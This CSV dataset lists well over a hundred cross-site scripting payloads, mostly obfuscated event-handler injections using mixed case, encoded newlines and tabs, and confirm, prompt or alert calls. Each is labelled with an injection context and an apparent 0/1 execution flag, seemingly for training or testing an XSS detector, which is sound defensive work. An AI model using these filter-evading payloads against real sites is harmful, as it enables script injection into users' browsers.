payload,context,exec,combined
"<iframe srcdoc=""<script>alert(1)</script>"">",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <iframe srcdoc=""<script>alert(1)</script>"">"
<htMl%0dOnMoUSEOvEr%0a=%0a(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htMl%0dOnMoUSEOvEr%0a=%0a(prompt)``%0dx//
<d3v%0aonMOuseOVeR%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aonMOuseOVeR%0d=%0d(confirm)()>v3dm0s
"<A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s"
<hTml%09OnpOiNTErenTer%0a=%0aconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTml%09OnpOiNTErenTer%0a=%0aconfirm()//
"<a%0dOnmOusEoVEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0dOnmOusEoVEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<D3V%0aonPoInTeRENTeR%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aonPoInTeRENTeR%09=%09[8].find(confirm)>v3dm0s
<A/+/oNPOiNTERENtER%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/oNPOiNTERENtER%0a=%0aconfirm()>v3dm0s
"<a%0aOnPointeREnTeR%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnPointeREnTeR%0d=%0da=prompt,a()%0dx>v3dm0s"
<detAiLS%09OnPOintErenTer%0d=%0d(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAiLS%09OnPOintErenTer%0d=%0d(confirm)()//
"<a%0aOnpOINteRENter%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnpOINteRENter%09=%09a=prompt,a()>v3dm0s"
<deTAILS%0aOnpoINtErenTeR+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAILS%0aOnpoINtErenTeR+=+confirm()>
<a%0aonPOintEreNtER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aonPOintEreNtER%0d=%0dconfirm()%0dx>v3dm0s
<a%0aOnmOUSeOVeR+=+(prompt)``%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnmOUSeOVeR+=+(prompt)``%0dx>v3dm0s
<A%0donmOUSeovER%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0donmOUSeovER%0a=%0aconfirm()%0dx>v3dm0s
<dETAils/+/onPoInTeREnTEr%0a=%0a(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAils/+/onPoInTeREnTEr%0a=%0a(confirm)()%0dx>
<d3v%0dOnmOuSeovER+=+(prompt)``>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <d3v%0dOnmOuSeovER+=+(prompt)``>v3dm0s
<a%09onpoiNTerENtEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09onpoiNTerENtEr%0d=%0dconfirm()%0dx>v3dm0s
<D3V%09onPoiNTERenTeR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09onPoiNTERenTeR%0a=%0a[8].find(confirm)>v3dm0s
<HTml%0aonpOINterENteR%0a=%0aconfirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTml%0aonpOINterENteR%0a=%0aconfirm()//
<d3V%0aonpoinTeRENTeR%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aonpoinTeRENTeR%0a=%0aconfirm()>v3dm0s
test@example.com,html_text,0,CTX_html_text CTX_html_text CTX_html_text test@example.com
""" onkeyup=alert(1) """,html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute "" onkeyup=alert(1) """
<A%0donmouSeOVER%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0donmouSeOVER%09=%09confirm()%0dx>v3dm0s
"<DeTaiLS/+/onToGGlE%0a=%0aa=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DeTaiLS/+/onToGGlE%0a=%0aa=prompt,a()>"
<HtML%0dOnmoUSEOver+=+confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtML%0dOnmoUSEOver+=+confirm()>
<HTml%09OnmOUSEOvEr+=+confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTml%09OnmOUSEOvEr+=+confirm()>
<D3V%0aOnMouSeovER+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3V%0aOnMouSeovER+=+confirm()%0dx>v3dm0s
<HTML/+/oNMoUSEOVeR%0a=%0aconfirm()//,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <HTML/+/oNMoUSEOVeR%0a=%0aconfirm()//
<dETailS%0dontoGglE+=+confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETailS%0dontoGglE+=+confirm()%0dx//
<D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s
""";prompt(1);//",script_block,1,"CTX_script_block CTX_script_block CTX_script_block "";prompt(1);//"
<d3v%0aonpoINtErentER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aonpoINtErentER%0d=%0d[8].find(confirm)%0dx>v3dm0s
<dEtails/+/ontoGgle+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtails/+/ontoGgle+=+confirm()>
<dEtails/+/ontoGgle+=+confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtails/+/ontoGgle+=+confirm()>
<hTmL%09OnpoiNtEreNter%0d=%0d(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTmL%09OnpoiNtEreNter%0d=%0d(confirm)()%0dx//
<hTMl%0aoNpointeREnter+=+[8].find(confirm)//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTMl%0aoNpointeREnter+=+[8].find(confirm)//
<d3v/+/oNpOinTEreNter%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/oNpOinTEreNter%0a=%0a(confirm)()%0dx>v3dm0s
<A%09oNMOusEoVER%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09oNMOusEoVER%0d=%0d(confirm)()%0dx>v3dm0s
<hTML%0aoNPoInTeRenteR+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTML%0aoNPoInTeRenteR+=+confirm()//
<DEtAiLs%0doNToggLe%0d=%0dconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtAiLs%0doNToggLe%0d=%0dconfirm()%0dx>
<hTmL%09ONPOINTeREnTER%0a=%0a[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTmL%09ONPOINTeREnTER%0a=%0a[8].find(confirm)%0dx//
"<D3V/+/oNMousEovEr%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/oNMousEovEr%09=%09a=prompt,a()%0dx>v3dm0s"
<D3v%0aONmOUsEover+=+(confirm)()%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aONmOUsEover+=+(confirm)()%0dx>v3dm0s
onmouseover=alert(1),html_attribute,1,CTX_html_attribute CTX_html_attribute CTX_html_attribute onmouseover=alert(1)
"<dETAILs%0dOnTOGgLE%0d=%0da=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dETAILs%0dOnTOGgLE%0d=%0da=prompt,a()>"
<dETaiLs%09OnpOInteREnTeR%09=%09confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETaiLs%09OnpOInteREnTeR%09=%09confirm()>
<dETAILs%09ONpoinTerENteR%0d=%0d[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAILs%09ONpoinTerENteR%0d=%0d[8].find(confirm)>
<Details%0aoNtoggLe+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Details%0aoNtoggLe+=+confirm()//
"<d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s"
<D3V%09oNmOUseoVeR%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09oNmOUseoVeR%0a=%0aconfirm()>v3dm0s
<D3v%09onpoInTerEnTer%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09onpoInTerEnTer%0d=%0dconfirm()>v3dm0s
<HTMl%09oNmouSeOVEr+=+(confirm)()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTMl%09oNmouSeOVEr+=+(confirm)()%0dx//
<D3v/+/ONMOUseoveR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/ONMOUseoveR%09=%09(prompt)``%0dx>v3dm0s
javascript:alert(document.title),url_href,1,CTX_url_href CTX_url_href CTX_url_href javascript:alert(document.title)
<HtML%0dONMOuSEoVer%0a=%0a[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtML%0dONMOuSEoVer%0a=%0a[8].find(confirm)>
<svg/onload=confirm`1`>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <svg/onload=confirm`1`>
<html%0aoNmOusEOver%09=%09[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <html%0aoNmOusEOver%09=%09[8].find(confirm)>
<DEtaILs%0aOntoGGLe%0a=%0a[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtaILs%0aOntoGGLe%0a=%0a[8].find(confirm)%0dx>
<d3V%0aonMoUseoVeR%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aonMoUseoVeR%0d=%0d(prompt)``>v3dm0s
<d3V%0aonpoiNTeRenTEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aonpoiNTeRenTEr%09=%09confirm()%0dx>v3dm0s
<D3V%0aoNMouSEoVer%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aoNMouSEoVer%09=%09(confirm)()>v3dm0s
<DETailS%0dontogGLE%09=%09(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETailS%0dontogGLE%09=%09(prompt)``//
"<d3v/+/oNPOiNTeRenTer+=+a=prompt,a()>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/oNPOiNTeRenTer+=+a=prompt,a()>v3dm0s"
<a/+/ONmouSeover+=+(confirm)()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a/+/ONmouSeover+=+(confirm)()>v3dm0s
<svg/onload=alert(String.fromCharCode(49))>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <svg/onload=alert(String.fromCharCode(49))>
"<dEtaILS/+/oNtogGlE%0d=%0da=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <dEtaILS/+/oNtogGlE%0d=%0da=prompt,a()%0dx>"
<dETAiLs%0aONToggle%0a=%0aconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAiLs%0aONToggle%0a=%0aconfirm()//
src=image,html_text,0,CTX_html_text CTX_html_text CTX_html_text src=image
"<A/+/oNmoUSEOVER%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A/+/oNmoUSEOVER%0d=%0da=prompt,a()>v3dm0s"
<D3v/+/OnmOuSeOver%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/OnmOuSeOver%0d=%0dconfirm()>v3dm0s
<d3v%0aOnMOUSeOver%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aOnMOUSeOver%0a=%0a(prompt)``%0dx>v3dm0s
<HtML/+/oNPOINtERENter+=+confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtML/+/oNPOINtERENter+=+confirm()%0dx//
<a/+/OnmouSeOVer%0a=%0a(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnmouSeOVer%0a=%0a(confirm)()>v3dm0s
<d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s
"<DeTAIls%0aONpoiNtErENTEr%0d=%0da=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DeTAIls%0aONpoiNtErENTEr%0d=%0da=prompt,a()%0dx//"
<A/+/oNpoiNterenteR+=+[8].find(confirm)>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNpoiNterenteR+=+[8].find(confirm)>v3dm0s
"<A%0doNmOuSEOVER%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%0doNmOuSEOVER%0d=%0da=prompt,a()%0dx>v3dm0s"
<a/+/OnMousEoVER%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnMousEoVER%0d=%0d(confirm)()%0dx>v3dm0s
<A/+/oNMOuSEOveR+=+[8].find(confirm)>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A/+/oNMOuSEOveR+=+[8].find(confirm)>v3dm0s
"<hTMl%09ONPOINtErENteR%0a=%0aa=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%09ONPOINtErENteR%0a=%0aa=prompt,a()%0dx//"
<a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s
<d3V%09oNmouSeOver+=+(prompt)``>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <d3V%09oNmouSeOver+=+(prompt)``>v3dm0s
<a%09ONPOInterEnter+=+(confirm)()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%09ONPOInterEnter+=+(confirm)()%0dx>v3dm0s
<d3v%0dONpOINteRENTER%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0dONpOINteRENTER%0a=%0a[8].find(confirm)>v3dm0s
<HtmL%0aonmouSEovER%09=%09confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtmL%0aonmouSEovER%09=%09confirm()%0dx//
<D3V%09OnpOINTErENtER%0a=%0a(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09OnpOINTErENtER%0a=%0a(confirm)()>v3dm0s
<D3V%0aoNMouSEoVer%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aoNMouSEoVer%09=%09(confirm)()>v3dm0s
<D3V%0dONMOusEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0dONMOusEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s
<a/+/OnPOINterEnTer%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnPOINterEnTer%09=%09(prompt)``%0dx>v3dm0s
<d3V%0donPoInTErEnter%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0donPoInTErEnter%0d=%0d(confirm)()>v3dm0s
<dETAiLS%0donPOInTeRenTEr+=+(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAiLS%0donPOInTeRenTEr+=+(confirm)()%0dx//
<deTaiLS%0donpOINteReNteR%0a=%0a(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTaiLS%0donpOINteReNteR%0a=%0a(confirm)()>
<dEtaiLS%0aOnTOgGle%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtaiLS%0aOnTOgGle%0a=%0aconfirm()%0dx//
"<a%0dOnPOInTerENter%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0dOnPOInTerENter%0d=%0da=prompt,a()%0dx>v3dm0s"
<hTML/+/oNPoiNteRENTeR%0a=%0a(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTML/+/oNPoiNteRENTeR%0a=%0a(prompt)``%0dx//
<HtML%0doNpoINTerEnTeR+=+[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtML%0doNpoINTerEnTeR+=+[8].find(confirm)%0dx>
"<d3v/+/oNpoiNtEReNTer+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <d3v/+/oNpoiNtEReNTer+=+a=prompt,a()%0dx>v3dm0s"
<hTml/+/ONMOuSeover%0a=%0a[8].find(confirm)%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTml/+/ONMOuSeover%0a=%0a[8].find(confirm)%0dx//
"<DETAILS/+/oNPOInTERENtER%09=%09a=prompt,a()//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DETAILS/+/oNPOInTERENtER%09=%09a=prompt,a()//"
<svg onload,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <svg onload
"<a%0aOnPoIntERENTER+=+a=prompt,a()>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <a%0aOnPoIntERENTER+=+a=prompt,a()>v3dm0s"
javascript:alert(String.fromCharCode(49)),html_text,0,CTX_html_text CTX_html_text CTX_html_text javascript:alert(String.fromCharCode(49))
"<a%0dOnPOInTerENter%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0dOnPOInTerENter%0d=%0da=prompt,a()%0dx>v3dm0s"
<D3V%0aoNmOuSEOvER%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aoNmOuSEOvER%0a=%0aconfirm()%0dx>v3dm0s
<htML%0donmOusEoveR%09=%09(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htML%0donmOusEoveR%09=%09(prompt)``%0dx//
<d3V/+/ONpOinteRENtER%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/ONpOinteRENtER%0d=%0d(prompt)``>v3dm0s
<A/+/onMOusEOVEr+=+(prompt)``%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A/+/onMOusEOVEr+=+(prompt)``%0dx>v3dm0s
<hTmL/+/ONpoINTeRENTEr+=+(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTmL/+/ONpoINTeRENTEr+=+(confirm)()%0dx>
<detaiLs/+/OnpOinTerENtEr%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detaiLs/+/OnpOinTerENtEr%0a=%0aconfirm()%0dx//
<A%0aonmOuseoVer+=+confirm()%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonmOuseoVer+=+confirm()%0dx>v3dm0s
<a%0aONpoIntERenteR%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aONpoIntERenteR%0d=%0d(confirm)()%0dx>v3dm0s
<detAilS/+/onToGGLe+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAilS/+/onToGGLe+=+confirm()//
"<D3V%0donmOUseoVeR%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V%0donmOUseoVeR%09=%09a=prompt,a()%0dx>v3dm0s"
"<D3V/+/oNMousEovEr%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V/+/oNMousEovEr%09=%09a=prompt,a()%0dx>v3dm0s"
<A/+/ONPointerenTeR%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/ONPointerenTeR%09=%09(confirm)()%0dx>v3dm0s
<deTaIls%0dONTOgGle%0a=%0aconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTaIls%0dONTOgGle%0a=%0aconfirm()//
<A%0aoNpOinteReNtEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aoNpOinteReNtEr%0d=%0d(confirm)()>v3dm0s
<d3v%0doNpoIntErEntEr+=+[8].find(confirm)>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <d3v%0doNpoIntErEntEr+=+[8].find(confirm)>v3dm0s
"<a%0doNPointErEnTer%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0doNPointErEnTer%09=%09a=prompt,a()%0dx>v3dm0s"
<iframe src=javascript:alert(1)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <iframe src=javascript:alert(1)>
<DetailS%09ONtOGGLe+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetailS%09ONtOGGLe+=+confirm()//
<d3v%09onMouSeoveR+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09onMouSeoveR+=+confirm()>v3dm0s
<d3V%09ONMOUSeover%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09ONMOUSeover%09=%09[8].find(confirm)>v3dm0s
<A%0aonmOuseoVer%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonmOuseoVer%0d=%0d(confirm)()>v3dm0s
<DETaIlS%09oNpoiNTERenteR%09=%09confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETaIlS%09oNpoiNTERenteR%09=%09confirm()//
<d3V%09OnpOiNterENter+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09OnpOiNterENter+=+confirm()>v3dm0s
"<a%0aonmoUSeover%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0aonmoUSeover%0a=%0aa=prompt,a()>v3dm0s"
<A/+/oNPOiNTERENtER%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNPOiNTERENtER%0a=%0aconfirm()>v3dm0s
"<dEtAiLs%0aOnpOINTEreNTEr%09=%09a=prompt,a()%0dx//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <dEtAiLs%0aOnpOINTEreNTEr%09=%09a=prompt,a()%0dx//"
<htMl%09ONpOiNteREntEr+=+(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl%09ONpOiNteREntEr+=+(confirm)()%0dx//
<A%0dOnPoiNtErEnTer%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnPoiNtErEnTer%09=%09[8].find(confirm)>v3dm0s
<HTMl/+/ONMousEOVeR%09=%09(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTMl/+/ONMousEOVeR%09=%09(confirm)()>
<A/+/onMOuSEOVER%09=%09[8].find(confirm)%0dx>v3dm0s,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <A/+/onMOuSEOVER%09=%09[8].find(confirm)%0dx>v3dm0s
<DETails/+/ONpoINTEreNTeR%09=%09[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETails/+/ONpoINTEreNTeR%09=%09[8].find(confirm)>
<HtmL%09onpOIntEreNteR%09=%09(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%09onpOIntEreNteR%09=%09(confirm)()//
""" onclick=alert(1)",html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute "" onclick=alert(1)"
<hTmL/+/oNPoiNtErENtEr+=+(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTmL/+/oNPoiNtErENtEr+=+(prompt)``%0dx>
<A%0dONpoINterENTeR%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dONpoINterENTeR%0d=%0dconfirm()>v3dm0s
<dEtAiLS%0aontOGgle%0d=%0d[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtAiLS%0aontOGgle%0d=%0d[8].find(confirm)%0dx>
<a%09OnpoINterEnTEr%09=%09(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09OnpoINterEnTEr%09=%09(prompt)``>v3dm0s
<d3v%09OnmoUseoVer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09OnmoUseoVer%0d=%0dconfirm()%0dx>v3dm0s
<a%09ONMOUSeOver%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09ONMOUSeOver%0d=%0dconfirm()%0dx>v3dm0s
<HTMl%0aOnmOuSeOVeR%0a=%0a(confirm)()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTMl%0aOnmOuSeOVeR%0a=%0a(confirm)()//
;alert(navigator.userAgent);//,html_text,0,CTX_html_text CTX_html_text CTX_html_text ;alert(navigator.userAgent);//
""" onmouseenter=alert(1) """,html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute "" onmouseenter=alert(1) """
&#60;svg&#62;,html_text,0,CTX_html_text CTX_html_text CTX_html_text &#60;svg&#62;
